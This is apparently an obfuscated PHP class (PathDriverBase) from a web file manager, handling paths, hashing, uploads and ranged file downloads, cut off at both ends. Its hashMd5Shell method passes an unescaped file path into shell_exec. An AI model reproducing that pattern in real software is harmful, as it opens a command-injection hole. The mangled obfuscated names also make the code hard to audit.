listAll($âÚ©Ä¥) { $Ë—‹‰Š =& $_SERVER[´È¥ö†ö]; $Úã¾ëÈ† = IO::info($this->pathParse[$Ë—‹‰Š[87]]); if (!$Úã¾ëÈ†) { return array(); } $Ñ©ê†ìš = $this->model->listAll($âÚ©Ä¥); $ÙŠ™—± = Model($Ë—‹‰Š[678])->getInfo($Úã¾ëÈ†[$Ë—‹‰Š[679]]); foreach ($Ñ©ê†ìš as &$‰Ã¶Ú„½) { check_abort(); $‰Ã¶Ú„½[$Ë—‹‰Š[90]] = Action($Ë—‹‰Š[1427])->_shareItemeParse($‰Ã¶Ú„½[$Ë—‹‰Š[90]], $ÙŠ™—±); } unset($‰Ã¶Ú„½); return $Ñ©ê†ìš; } } goto cËÖ„îàËÙ; Dø¼ˆÍ²Ï´: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $šºšœä³ =& $_SERVER[´È¥ö†ö]; $this->objectDriver = array($šºšœä³[60], $šºšœä³[61], $šºšœä³[62], $šºšœä³[63], $šºšœä³[64], $šºšœä³[65], $šºšœä³[66], $šºšœä³[67], $šºšœä³[68], $šºšœä³[69], $šºšœä³[70], $šºšœä³[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($Ÿ ·¾Š) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($Ÿ ·¾Š, $_SERVER[´È¥ö†ö][8]); } return $Ÿ ·¾Š; } public function iconvApp($®¦ëı‰­) { return $®¦ëı‰­; } public function iconvSystem($ñŞƒæ¨Ø) { return $ñŞƒæ¨Ø; } public function iconvTo($Ë‘·„ÇŸ, $ûú’¶Í, $êÖ¤™”İ) { $½¡œ†¡„ =& $_SERVER[´È¥ö†ö]; if (!$Ë‘·„ÇŸ || !function_exists($½¡œ†¡„[72])) { return $Ë‘·„ÇŸ; } static $ŠÛüŒ¡² = array(); $÷óÑÈû¯ = $ûú’¶Í . $½¡œ†¡„[73] . $êÖ¤™”İ . $½¡œ†¡„[74] . $Ë‘·„ÇŸ; if (isset($ŠÛüŒ¡²[$÷óÑÈû¯])) { return $ŠÛüŒ¡²[$÷óÑÈû¯]; } if (function_exists($½¡œ†¡„[75])) { $§ÙÁ£’½ = @mb_convert_encoding($Ë‘·„ÇŸ, $êÖ¤™”İ, $ûú’¶Í); } else { $§ÙÁ£’½ = @iconv($ûú’¶Í, $êÖ¤™”İ, $Ë‘·„ÇŸ); } $§ÙÁ£’½ = $§ÙÁ£’½ ? $§ÙÁ£’½ : $Ë‘·„ÇŸ; if (strstr($§ÙÁ£’½, $½¡œ†¡„[76])) { $§ÙÁ£’½ = str_replace($½¡œ†¡„[76], $½¡œ†¡„[11], $§ÙÁ£’½); } $ŠÛüŒ¡²[$ûú’¶Í . $½¡œ†¡„[73] . $êÖ¤™”İ . $½¡œ†¡„[74] . $Ë‘·„ÇŸ] = $§ÙÁ£’½; $ŠÛüŒ¡²[$êÖ¤™”İ . $½¡œ†¡„[73] . $ûú’¶Í . $½¡œ†¡„[74] . $Ë‘·„ÇŸ] = $Ë‘·„ÇŸ; $ŠÛüŒ¡²[$êÖ¤™”İ . $½¡œ†¡„[73] . $ûú’¶Í . $½¡œ†¡„[74] . $§ÙÁ£’½] = $Ë‘·„ÇŸ; $ŠÛüŒ¡²[$ûú’¶Í . $½¡œ†¡„[73] . $êÖ¤™”İ . $½¡œ†¡„[74] . $§ÙÁ£’½] = $§ÙÁ£’½; return $§ÙÁ£’½; } public function getPathInner($ì˜÷Àù´) { $’œ«ßÎ = IO::init($ì˜÷Àù´); return $’œ«ßÎ->path; } public function getPathOuter($˜‘™µä§) { $³éÕÜÆ =& $_SERVER[´È¥ö†ö]; $™‘¤Şã» = strlen(trim($this->pathBase, $³éÕÜÆ[8])); $˜‘™µä§ = substr(trim($˜‘™µä§, $³éÕÜÆ[8]), $™‘¤Şã»); return $this->pathDriver . $³éÕÜÆ[8] . ltrim($˜‘™µä§, $³éÕÜÆ[8]); } public function isParentOf($Ÿû¦Âšî, $æüØöé) { $ğ¬Ùİï =& $_SERVER[´È¥ö†ö]; $Ÿû¦Âšî = rtrim(strtolower($Ÿû¦Âšî), $ğ¬Ùİï[8]) . $ğ¬Ùİï[8]; $æüØöé = rtrim(strtolower($æüØöé), $ğ¬Ùİï[8]) . $ğ¬Ùİï[8]; $ê§§Â“ = strpos($æüØöé, $Ÿû¦Âšî) === 0; return $ê§§Â“; } public function getType() { $¼Ø†›ÙÜ =& $_SERVER[´È¥ö†ö]; $ÉÅĞœÕè = str_replace($¼Ø†›ÙÜ[77], $¼Ø†›ÙÜ[12], get_class($this)); return strtolower($ÉÅĞœÕè); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($ãÚêÌŒ•, $”„İ¨•) { $”ÒÍïŞ§ =& $_SERVER[´È¥ö†ö]; $æıä÷ó® = rtrim($ãÚêÌŒ•, $”ÒÍïŞ§[8]) . $”ÒÍïŞ§[8] . $”„İ¨•; $òÈ‚†ğ® = $this->exist($æıä÷ó®); return $òÈ‚†ğ® ? $æıä÷ó® : !1; } public function setModifyTime($Ò•“Ì’, $¾˜”İãî = '') { } public function renameObject($ñßç×ï, $Ù”û¾ÄÜ) { $ŞâÙ”Ä = $Ù”û¾ÄÜ; $ñßç×ï = $this->getPathOuter($ñßç×ï); $Ù”û¾ÄÜ = $this->pathFather($ñßç×ï) . $Ù”û¾ÄÜ; $ñËÕãıÙ = IO::copy($ñßç×ï, $this->pathFather($ñßç×ï), REPEAT_RENAME_FOLDER, $ŞâÙ”Ä); if ($ñËÕãıÙ) { IO::remove($ñßç×ï); } return $ñËÕãıÙ ? $Ù”û¾ÄÜ : !1; } public function tempFile($şï–ô‘Ì = '', $¢ÎŒ‰Â­ = '') { if (!$şï–ô‘Ì) { $şï–ô‘Ì = rand_string(15); } $‹¤óëƒ— = TEMP_FILES . rand_string(15) . $_SERVER[´È¥ö†ö][8]; @mkdir($‹¤óëƒ—, DEFAULT_PERRMISSIONS, !0); $Ç©šşù = $‹¤óëƒ— . $şï–ô‘Ì; @touch($Ç©šşù); if ($¢ÎŒ‰Â­) { file_put_contents($Ç©šşù, $¢ÎŒ‰Â­); } return $Ç©šşù; } public function tempFileRemve($Ã µÉşü) { @unlink($Ã µÉşü); @rmdir($this->pathFather($Ã µÉşü)); } public function mkfile($óò’®Ú¿, $¥¡ÔÊ” = '', $úÛ†©ì‡ = REPEAT_RENAME) { } public function mkdir($ç€æ•õ±, $—„‚¿ø´ = REPEAT_SKIP) { } public function delFile($ı±–İÓ”) { } public function delFolder($ãóŒƒ¥) { } public function copyFile($—Ì±–Ä‘, $´«šéı•) { } public function moveFile($§½ÈŠ˜Ù, $×¸äº¹Ã) { } public function remove($´…Û©áñ) { if ($this->isFile($´…Û©áñ)) { return $this->delFile($´…Û©áñ); } return $this->delFolder($´…Û©áñ); } public function rename($óşğ¦Ø, $Üç¢Å®õ) { } public function exist($ÆÈÈóªŒ) { } public function findByHash($»›‡×Æè = '', $Œñ×å€§ = '') { return !1; } public function isFile($—õƒ¤é) { } public function isFolder($ùÃöŞ‡Ù) { } public function size($åÈÙÓ›Ñ) { } public function info($´ğÇë‹£) { } public function infoSimple($Ş˜úÑÆí) { return $this->info($Ş˜úÑÆí); } public function infoAuth($ÏÍÌœ®Ö) { return $this->info($ÏÍÌœ®Ö); } public function infoFull($²¸±è¶) { return $this->info($²¸±è¶); } public function infoFullSimple($çËŠŠ ) { return $this->info($çËŠŠ ); } public function infoWithChildren($¹è³Åù—) { $‘˜È©àÃ =& $_SERVER[´È¥ö†ö]; static $¤ÀßèáÎ = array(); if (isset($¤ÀßèáÎ[$¹è³Åù—])) { return $¤ÀßèáÎ[$¹è³Åù—]; } $»×†º˜™ = $this->info($¹è³Åù—); if ($»×†º˜™ && $»×†º˜™[$‘˜È©àÃ[33]] == $‘˜È©àÃ[78]) { $ªÛ÷ƒìŠ = array($‘˜È©àÃ[79] => 0, $‘˜È©àÃ[80] => 0, $‘˜È©àÃ[81] => 0); $this->infoChildren($¹è³Åù—, $ªÛ÷ƒìŠ); $»×†º˜™[$‘˜È©àÃ[79]] = $ªÛ÷ƒìŠ[$‘˜È©àÃ[79]]; $»×†º˜™[$‘˜È©àÃ[82]] = array($‘˜È©àÃ[83] => $ªÛ÷ƒìŠ[$‘˜È©àÃ[80]], $‘˜È©àÃ[84] => $ªÛ÷ƒìŠ[$‘˜È©àÃ[81]]); $¤ÀßèáÎ[$¹è³Åù—] = $»×†º˜™; } return $»×†º˜™; } public function listPath($æë–ü‰Ú, $ğˆ¤éä = false) { } public function has($§×É²ñ, $‘ÊÛÖÎÈ = false, $Ç§¶·Ô = false) { } public function canRead($÷Ğ¥ÒøÄ) { } public function canWrite($¡ç”Ç·ö) { } public function getContent($ï ÍíÙÀ) { } public function setContent($¬ÚÂúŠ•, $ƒ¦şáúÆ = '') { } protected function infoChildren($¤Ê¸óÓÍ, &$Â³í––) { $³¯ğ„¿ç =& $_SERVER[´È¥ö†ö]; check_abort_echo(); $È„ÙèÜ– = $this->listPath($¤Ê¸óÓÍ, !0); $È„ÙèÜ– = array_merge($È„ÙèÜ–[$³¯ğ„¿ç[85]], $È„ÙèÜ–[$³¯ğ„¿ç[86]]); foreach ($È„ÙèÜ– as $Õ°œ³…Æ) { if ($Õ°œ³…Æ[$³¯ğ„¿ç[33]] == $³¯ğ„¿ç[78]) { $Â³í––[$³¯ğ„¿ç[81]]++; $æ©Ç§Æ¸ = $this->getPathInner($Õ°œ³…Æ[$³¯ğ„¿ç[87]]); $this->infoChildren($æ©Ç§Æ¸, $Â³í––); } else { $Â³í––[$³¯ğ„¿ç[80]]++; $Â³í––[$³¯ğ„¿ç[79]] += $Õ°œ³…Æ[$³¯ğ„¿ç[79]]; } } } public function fileSubstr($ÁØ•¿ó, $†÷æß‚â, $¦şØè´â) { } public function listAll($“©êÀ‡È) { } public function listAllMake($çÚåĞ‹À, &$é×¸”™×) { $­†²¡ºæ =& $_SERVER[´È¥ö†ö]; check_abort_echo(); $€»¯âÊ¹ = $this->listPath($çÚåĞ‹À, !0); if (!$€»¯âÊ¹) { return; } $ŒáÀ¶Òı = array_merge($€»¯âÊ¹[$­†²¡ºæ[85]], $€»¯âÊ¹[$­†²¡ºæ[86]]); foreach ($ŒáÀ¶Òı as $¤ÌŸÚ€Í) { $«Á÷ãÚ¦ = $¤ÌŸÚ€Í[$­†²¡ºæ[33]] == $­†²¡ºæ[78]; $¡»Ìíü‚ = array($­†²¡ºæ[87] => $¤ÌŸÚ€Í[$­†²¡ºæ[87]], $­†²¡ºæ[78] => $«Á÷ãÚ¦); if (isset($¤ÌŸÚ€Í[$­†²¡ºæ[79]])) { $¡»Ìíü‚[$­†²¡ºæ[79]] = $¤ÌŸÚ€Í[$­†²¡ºæ[79]]; } if (isset($¤ÌŸÚ€Í[$­†²¡ºæ[88]])) { $¡»Ìíü‚[$­†²¡ºæ[88]] = $¤ÌŸÚ€Í[$­†²¡ºæ[88]]; } if (!$«Á÷ãÚ¦) { $é×¸”™×[] = $¡»Ìíü‚; continue; } $é×¸”™×[] = $¡»Ìíü‚; $”ôü°˜ä = $¤ÌŸÚ€Í[$­†²¡ºæ[87]]; $èÖ“Ó·É = $this->pathDriver; if (substr($¤ÌŸÚ€Í[$­†²¡ºæ[87]], 0, strlen($èÖ“Ó·É)) == $èÖ“Ó·É) { $”ôü°˜ä = substr($”ôü°˜ä, strlen($èÖ“Ó·É)); } $this->listAllMake($”ôü°˜ä, $é×¸”™×); } } public function listAllSimple($ş’Îş•, $±±ê§Õ = false) { $¹ÔöŠë² = $this->listAll($ş’Îş•); return $this->listAllSimpleMake($¹ÔöŠë², $this->getPathOuter($ş’Îş•), $±±ê§Õ); } public function listAllSimpleMake($½ôé£Ó , $ò™‰«™¥, $”¦‰¼×“) { $™ƒÉ’ñ÷ =& $_SERVER[´È¥ö†ö]; $¼„“½Ÿö = array(); $ò™‰«™¥ = rtrim(get_path_father($ò™‰«™¥), $™ƒÉ’ñ÷[8]) . $™ƒÉ’ñ÷[8]; foreach ($½ôé£Ó  as $ò›í¨†Ğ) { $Şêäã = array($™ƒÉ’ñ÷[87] => $ò›í¨†Ğ[$™ƒÉ’ñ÷[87]], $™ƒÉ’ñ÷[89] => $ò›í¨†Ğ[$™ƒÉ’ñ÷[87]], $™ƒÉ’ñ÷[78] => $ò›í¨†Ğ[$™ƒÉ’ñ÷[78]]); if (isset($ò›í¨†Ğ[$™ƒÉ’ñ÷[79]]) && !$ò›í¨†Ğ[$™ƒÉ’ñ÷[78]]) { $Şêäã[$™ƒÉ’ñ÷[79]] = $ò›í¨†Ğ[$™ƒÉ’ñ÷[79]]; } if (isset($ò›í¨†Ğ[$™ƒÉ’ñ÷[88]])) { $Şêäã[$™ƒÉ’ñ÷[88]] = $ò›í¨†Ğ[$™ƒÉ’ñ÷[88]]; } if (is_array($ò›í¨†Ğ[$™ƒÉ’ñ÷[90]])) { $Şêäã[$™ƒÉ’ñ÷[89]] = $ò›í¨†Ğ[$™ƒÉ’ñ÷[90]][$™ƒÉ’ñ÷[87]]; $Şêäã[$™ƒÉ’ñ÷[79]] = $ò›í¨†Ğ[$™ƒÉ’ñ÷[90]][$™ƒÉ’ñ÷[79]]; $Şêäã[$™ƒÉ’ñ÷[88]] = $ò›í¨†Ğ[$™ƒÉ’ñ÷[90]][$™ƒÉ’ñ÷[88]]; } else { if (substr($ò›í¨†Ğ[$™ƒÉ’ñ÷[87]], 0, strlen($ò™‰«™¥)) == $ò™‰«™¥) { $Şêäã[$™ƒÉ’ñ÷[87]] = substr($ò›í¨†Ğ[$™ƒÉ’ñ÷[87]], strlen($ò™‰«™¥)); } } $´ûã¥€Ê = $ò›í¨†Ğ[$™ƒÉ’ñ÷[78]] ? $™ƒÉ’ñ÷[8] : $™ƒÉ’ñ÷[12]; $Şêäã[$™ƒÉ’ñ÷[89]] = rtrim($Şêäã[$™ƒÉ’ñ÷[89]], $™ƒÉ’ñ÷[8]) . $´ûã¥€Ê; $Şêäã[$™ƒÉ’ñ÷[87]] = $™ƒÉ’ñ÷[8] . trim($Şêäã[$™ƒÉ’ñ÷[87]], $™ƒÉ’ñ÷[8]) . $´ûã¥€Ê; if (!$”¦‰¼×“) { $”ûÈ¶ñŠ = explode($™ƒÉ’ñ÷[8], trim($Şêäã[$™ƒÉ’ñ÷[87]], $™ƒÉ’ñ÷[8])); $Şêäã[$™ƒÉ’ñ÷[87]] = $™ƒÉ’ñ÷[8] . implode($™ƒÉ’ñ÷[8], array_slice($”ûÈ¶ñŠ, 1)) . $´ûã¥€Ê; } $¼„“½Ÿö[] = $Şêäã; } return array_sort_by($¼„“½Ÿö, $™ƒÉ’ñ÷[87]); } public function upload($•í±¬¾ô, $‰Ä¾²½, $ÖõÍ§Öã = false, $ìôÚßŠû = REPEAT_REPLACE) { } public function uploadFileByID($†İìÅ‹, $«Š¦İ—Ë, $ÜÀ·Şãã) { } public function uploadFileByPath($Çş‚¿œ, $°î„Ú‡ó, $…¨ùÏá = array()) { } public function isUploadServer() { $óÀ™¢Å³ =& $_SERVER[´È¥ö†ö]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $óÀ™¢Å³[91]) { return !0; } return $GLOBALS[$óÀ™¢Å³[6]][$óÀ™¢Å³[92]][$óÀ™¢Å³[93]]; } public function isFileOutServer() { $ïšãç… =& $_SERVER[´È¥ö†ö]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $ïšãç…[91]) { return !0; } return $GLOBALS[$ïšãç…[6]][$ïšãç…[92]][$ïšãç…[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($›ƒ©½£¥) { $öˆëª•¿ =& $_SERVER[´È¥ö†ö]; if (!$this->isCdnHost()) { return $›ƒ©½£¥; } return str_replace(trim(get_url_root($›ƒ©½£¥), $öˆëª•¿[8]), trim($this->cdnHost, $öˆëª•¿[8]), $›ƒ©½£¥); } public function uploadLink($İöºÉ­, $É—æ¹óˆ = 0) { $¥îõ÷Ì =& $_SERVER[´È¥ö†ö]; if ($this->isUploadServer()) { return; } $îºŠïéğ = $this->getType(); if (!in_array($îºŠïéğ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ç»«™á = 1024 * 1024 * 10; $åì¡–ñå = $É—æ¹óˆ <= $ç»«™á ? $¥îõ÷Ì[95] : $¥îõ÷Ì[96]; $¢Êó‹¶ì = (!$É—æ¹óˆ ? 1 : ceil($É—æ¹óˆ / pow(1024, 3))) * 3600 * 4; $Š„Ö´Å¿ = $this->{$åì¡–ñå}($İöºÉ­, $¢Êó‹¶ì); if ($Š„Ö´Å¿) { $Š„Ö´Å¿[$¥îõ÷Ì[97]] = $İöºÉ­; $Š„Ö´Å¿[$¥îõ÷Ì[98]] = $îºŠïéğ; } return $Š„Ö´Å¿; } public function uploadFormData($ŠğÛŸÔü, $ù£Ë±‚š = 3600) { } public function uploadMultiData($éßØÍìš, $Ïñƒˆ»ª = 3600) { } public function multiUploadFormData($òÒ¢¢œ¯, $…ÄÏ¤ = 3600) { return $this->uploadMultiData($òÒ¢¢œ¯, $…ÄÏ¤); } public function download($×ãŸë§Á, $²åÊ¼İö) { } public function ext($ÎêÚëÌ) { $¤¯¯Àçİ =& $_SERVER[´È¥ö†ö]; if (strpos($ÎêÚëÌ, $¤¯¯Àçİ[8]) === -1) { $í²˜Óª© = $ÎêÚëÌ; } else { $í²˜Óª© = $this->pathThis($ÎêÚëÌ); } $ñßƒ•—Á = $¤¯¯Àçİ[12]; if (strstr($í²˜Óª©, $¤¯¯Àçİ[10])) { $ñßƒ•—Á = substr($í²˜Óª©, strrpos($í²˜Óª©, $¤¯¯Àçİ[10]) + 1); $ñßƒ•—Á = strtolower($ñßƒ•—Á); } if (strlen($ñßƒ•—Á) > 3 && preg_match($¤¯¯Àçİ[99], $ñßƒ•—Á, $‡ñ­€ö)) { $ñßƒ•—Á = $¤¯¯Àçİ[12]; } return $ñßƒ•—Á; } public function pathThis($¹Ú”ñäú) { $«ì­´ó =& $_SERVER[´È¥ö†ö]; $¹Ú”ñäú = str_replace($«ì­´ó[100], $«ì­´ó[8], rtrim($¹Ú”ñäú, $«ì­´ó[8])); $›‘Üç†‰ = strrpos($¹Ú”ñäú, $«ì­´ó[8]); if ($›‘Üç†‰ === !1) { return $¹Ú”ñäú; } return substr($¹Ú”ñäú, $›‘Üç†‰ + 1); } public function pathFather($•Ä×ù’) { $Å§¬±î =& $_SERVER[´È¥ö†ö]; $•Ä×ù’ = str_replace($Å§¬±î[100], $Å§¬±î[8], rtrim($•Ä×ù’, $Å§¬±î[8])); $ê»à¥Şğ = strrpos($•Ä×ù’, $Å§¬±î[8]); if ($ê»à¥Şğ === !1) { return $Å§¬±î[12]; } return substr($•Ä×ù’, 0, $ê»à¥Şğ + 1); } public function hashSimple($ÅœµÄ¥) { $²ßšàºí =& $_SERVER[´È¥ö†ö]; if (!$ÅœµÄ¥) { return md5($²ßšàºí[12]); } $ĞÕ¥ Şš = $this->size($ÅœµÄ¥); $Ì»®Ş™Ü = 200; $œø£‡Š = 50; if ($ĞÕ¥ Şš <= $Ì»®Ş™Ü * $œø£‡Š) { return $this->hashMd5($ÅœµÄ¥) . $ĞÕ¥ Şš; } $“å®Šâ = intval($ĞÕ¥ Şš / $œø£‡Š); $ÁÉÂÆ´ = $²ßšàºí[12]; for ($‡ “ñÂ = 0; $‡ “ñÂ < $œø£‡Š; $‡ “ñÂ++) { $ÁÉÂÆ´ .= $this->fileSubstr($ÅœµÄ¥, $“å®Šâ * $‡ “ñÂ, $Ì»®Ş™Ü); } $ÁÉÂÆ´ .= $this->fileSubstr($ÅœµÄ¥, $ĞÕ¥ Şš - $Ì»®Ş™Ü, $Ì»®Ş™Ü); return md5($ÁÉÂÆ´) . $ĞÕ¥ Şš; } public static $md5Cache = array(); public function hashMd5($À…€èğô) { if (!$À…€èğô) { return md5($_SERVER[´È¥ö†ö][12]); } $À…€èğô = $this->iconvSystem($À…€èğô); if (isset(self::$md5Cache[$À…€èğô])) { return self::$md5Cache[$À…€èğô]; } self::$md5Cache[$À…€èğô] = $this->hashMd5Shell($À…€èğô); if (!self::$md5Cache[$À…€èğô]) { self::$md5Cache[$À…€èğô] = @md5_file($À…€èğô); } return self::$md5Cache[$À…€èğô]; } private function hashMd5Shell($›Ö×™å) { $úà½–Ö´ =& $_SERVER[´È¥ö†ö]; if (!$›Ö×™å) { return md5($úà½–Ö´[12]); } if (!function_exists($úà½–Ö´[101])) { return !1; } $¡âµæë€ = array($úà½–Ö´[102], $úà½–Ö´[103]); $±Ë¦àç™ = Cache::get($úà½–Ö´[104]); if (!$±Ë¦àç™) { $±“úˆ © = BASIC_PATH . $úà½–Ö´[105]; $Ú¢€Î¬ˆ = md5_file($±“úˆ ©); $±Ë¦àç™ = $úà½–Ö´[106]; foreach ($¡âµæë€ as $öİ¾”÷³) { $©½…äËá = shell_exec($öİ¾”÷³ . "\x20\x22{$±“úˆ ©}\42"); if ($©½…äËá && substr(trim($©½…äËá), 0, 32) == $Ú¢€Î¬ˆ) { $±Ë¦àç™ = $öİ¾”÷³; break; } } Cache::set($úà½–Ö´[104], $±Ë¦àç™, 3600); } if ($±Ë¦àç™ == $úà½–Ö´[106]) { return !1; } $©½…äËá = shell_exec($±Ë¦àç™ . "\40\x22{$›Ö×™å}\42"); $©½…äËá = str_replace($úà½–Ö´[107], $úà½–Ö´[12], $©½…äËá); return substr($©½…äËá, 0, 32); } public function link($»ù£Åµş) { return $»ù£Åµş; } public function fileOut($£ß÷‹ ù, $²Ü€ªú = false, $Ô¤ˆÇƒË = false, $çÔåº²œ = '') { $Ë ¡ Ï¬ =& $_SERVER[´È¥ö†ö]; $this->cacheMethod(null, null); if (!$£ß÷‹ ù || !$this->exist($£ß÷‹ ù)) { show_json(LNG($Ë ¡ Ï¬[108]), !1, $Ô¤ˆÇƒË); } $áÇş­‚¶ = $this->getType() == $Ë ¡ Ï¬[109]; $Äİ™š = $GLOBALS[$Ë ¡ Ï¬[6]][$Ë ¡ Ï¬[92]][$Ë ¡ Ï¬[110]][$Ë ¡ Ï¬[111]]; $ÑŸ·¬•õ = (double) $GLOBALS[$Ë ¡ Ï¬[6]][$Ë ¡ Ï¬[92]][$Ë ¡ Ï¬[110]][$Ë ¡ Ï¬[112]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $šÉ’¼Š« = $this->infoFull($£ß÷‹ ù); $Û¤æÉ´Ö = $šÉ’¼Š«[$Ë ¡ Ï¬[79]]; $È½ßœï˜ = gmdate($Ë ¡ Ï¬[113], $šÉ’¼Š«[$Ë ¡ Ï¬[88]]); $°’µ“üæ = $Ô¤ˆÇƒË ? $Ô¤ˆÇƒË : $this->iconvApp($šÉ’¼Š«[$Ë ¡ Ï¬[32]]); $â”œ¥ó¾ = 0; $Ş‘íÎ = $Û¤æÉ´Ö - 1; $İº‘Îç = $this->ext($°’µ“üæ); if (in_array($İº‘Îç, array($Ë ¡ Ï¬[114], $Ë ¡ Ï¬[115], $Ë ¡ Ï¬[116], $Ë ¡ Ï¬[117]))) { $İº‘Îç = $Ë ¡ Ï¬[118]; } if (in_array($İº‘Îç, array($Ë ¡ Ï¬[119]))) { $İº‘Îç = $Ë ¡ Ï¬[120]; } if (!$çÔåº²œ) { $çÔåº²œ = md5($È½ßœï˜ . $Û¤æÉ´Ö); } $çÔåº²œ = $Ë ¡ Ï¬[121] . $çÔåº²œ . $Ë ¡ Ï¬[121]; $¥í¾–§Ş = get_file_mime($İº‘Îç); $İ Õšƒã = !0; $İ Õšƒã = isset($_GET[$Ë ¡ Ï¬[122]]) ? !1 : !0; if ($²Ü€ªú === !1 && !mime_support($¥í¾–§Ş)) { $¥í¾–§Ş = $Ë ¡ Ï¬[123]; } header($Ë ¡ Ï¬[124]); header($Ë ¡ Ï¬[125] . $¥í¾–§Ş); $Ù ¾ıãÅ = rawurlencode($°’µ“üæ); $Ù ¾ıãÅ = $Ë ¡ Ï¬[121] . $Ù ¾ıãÅ . $Ë ¡ Ï¬[126] . $Ù ¾ıãÅ; if ($²Ü€ªú) { header($Ë ¡ Ï¬[127]); header($Ë ¡ Ï¬[128] . $Ù ¾ıãÅ); } else { if ($İ Õšƒã) { header($Ë ¡ Ï¬[129] . $Ù ¾ıãÅ); } } $ËğŸ©³ = 3600 * 24 * 30; header($Ë ¡ Ï¬[130]); header($Ë ¡ Ï¬[131]); header($Ë ¡ Ï¬[132] . $ËğŸ©³); header($Ë ¡ Ï¬[133] . gmdate($Ë ¡ Ï¬[113], time() + $ËğŸ©³) . $Ë ¡ Ï¬[134]); if (isset($_SERVER[$Ë ¡ Ï¬[135]]) && strtotime($_SERVER[$Ë ¡ Ï¬[135]]) == $šÉ’¼Š«[$Ë ¡ Ï¬[88]]) { header($Ë ¡ Ï¬[136], !0, 304); die; } if (isset($_SERVER[$Ë ¡ Ï¬[137]]) && $_SERVER[$Ë ¡ Ï¬[137]] == $çÔåº²œ) { header($Ë ¡ Ï¬[138] . $çÔåº²œ, !0, 304); die; } header($Ë ¡ Ï¬[138] . $çÔåº²œ); header($Ë ¡ Ï¬[139] . $È½ßœï˜ . $Ë ¡ Ï¬[134]); header($Ë ¡ Ï¬[140] . $°’µ“üæ); header($Ë ¡ Ï¬[141]); header($Ë ¡ Ï¬[142] . $Û¤æÉ´Ö); header($Ë ¡ Ï¬[143]); Hook::trigger($Ë ¡ Ï¬[144], $£ß÷‹ ù, $Û¤æÉ´Ö, $°’µ“üæ, $İº‘Îç); if (!$²Ü€ªú && $İº‘Îç == $Ë ¡ Ï¬[145]) { if ($Û¤æÉ´Ö > 1024 * 1024 * 5) { die; } $ƒ»Ğê¸ = $this->getContent($£ß÷‹ ù); $ƒ»Ğê¸ = Html::clearSVG($ƒ»Ğê¸); header($Ë ¡ Ï¬[146] . strlen($ƒ»Ğê¸)); echo $ƒ»Ğê¸; die; } $¹×ŠÀÜ¼ = strtolower($_SERVER[$Ë ¡ Ï¬[147]]); if ($áÇş­‚¶ && $¹×ŠÀÜ¼ && $Äİ™š) { if (strstr($¹×ŠÀÜ¼, $Ë ¡ Ï¬[148])) { header($Ë ¡ Ï¬[149] . $£ß÷‹ ù); } else { if (strstr($¹×ŠÀÜ¼, $Ë ¡ Ï¬[150])) { header($Ë ¡ Ï¬[151] . $£ß÷‹ ù); } else { if (strstr($¹×ŠÀÜ¼, $Ë ¡ Ï¬[152])) { header($Ë ¡ Ï¬[153] . $£ß÷‹ ù); } } } if ($ÑŸ·¬•õ) { header($Ë ¡ Ï¬[154] . $ÑŸ·¬•õ); } return; } if (isset($_SERVER[$Ë ¡ Ï¬[155]])) { if (preg_match($Ë ¡ Ï¬[156], $_SERVER[$Ë ¡ Ï¬[155]], $ÎşÁ¸Ô§)) { $â”œ¥ó¾ = intval($ÎşÁ¸Ô§[1]); $â”œ¥ó¾ = $â”œ¥ó¾ <= 0 ? 0 : ($â”œ¥ó¾ >= $Ş‘íÎ ? $Ş‘íÎ : $â”œ¥ó¾); if (!empty($ÎşÁ¸Ô§[2])) { $ı¯Ò©¿ = intval($ÎşÁ¸Ô§[2]); $Ş‘íÎ = $ı¯Ò©¿ < $â”œ¥ó¾ ? $â”œ¥ó¾ : ($ı¯Ò©¿ >= $Ş‘íÎ ? $Ş‘íÎ : $ı¯Ò©¿); } } header($Ë ¡ Ï¬[157]); header("\x43\157\156\x74\145\156\164\55\122\141\156\147\x65\72\40\x62\171\x74\x65\163\x20{$â”œ¥ó¾}\55{$Ş‘íÎ}\57" . $Û¤æÉ´Ö); } else { header($Ë ¡ Ï¬[158]); } header($Ë ¡ Ï¬[159]); header($Ë ¡ Ï¬[160]); $…¼î„·¤ = !0; if ($_SERVER[$Ë ¡ Ï¬[161]] == $Ë ¡ Ï¬[162] && $Û¤æÉ´Ö > 1204 * 1024 * 1024 * 2) { $…¼î„·¤ = !1; } if ($…¼î„·¤) { header($Ë ¡ Ï¬[163] . ($Ş‘íÎ - $â”œ¥ó¾ + 1)); } if ($_SERVER[$Ë ¡ Ï¬[164]] == $Ë ¡ Ï¬[165]) { return; } $³ŸÕœú = array($Ë ¡ Ï¬[166] => !1, $Ë ¡ Ï¬[167] => $â”œ¥ó¾, $Ë ¡ Ï¬[168] => $Ş‘íÎ, $Ë ¡ Ï¬[169] => $İº‘Îç, $Ë ¡ Ï¬[170] => $šÉ’¼Š«, $Ë ¡ Ï¬[171] => $Ë ¡ Ï¬[12], $Ë ¡ Ï¬[172] => 0); $³ŸÕœú = Hook::filter($Ë ¡ Ï¬[173], $³ŸÕœú); $ÚèÕÍ‘† = 1024 * 300; $¿½Ãê® = 0; if ($ÑŸ·¬•õ) { $¿½Ãê® = intval(1000 * 1000 * ($ÚèÕÍ‘† / $ÑŸ·¬•õ)); } while ($â”œ¥ó¾ <= $Ş‘íÎ) { $˜‰ŞèâÜ = timeFloat(); check_abort(); $€ñîş  = $Ş‘íÎ - $â”œ¥ó¾ + 1; if ($€ñîş  <= $ÚèÕÍ‘†) { $ÚèÕÍ‘† = $€ñîş ; } $ƒ»Ğê¸ = $this->fileSubstr($£ß÷‹ ù, $â”œ¥ó¾, $ÚèÕÍ‘†); if ($³ŸÕœú[$Ë ¡ Ï¬[166]]) { $³ŸÕœú[$Ë ¡ Ï¬[171]] = $ƒ»Ğê¸; $³ŸÕœú[$Ë ¡ Ï¬[172]] = $â”œ¥ó¾; $³ŸÕœú = Hook::filter($Ë ¡ Ï¬[174], $³ŸÕœú); $ƒ»Ğê¸ = 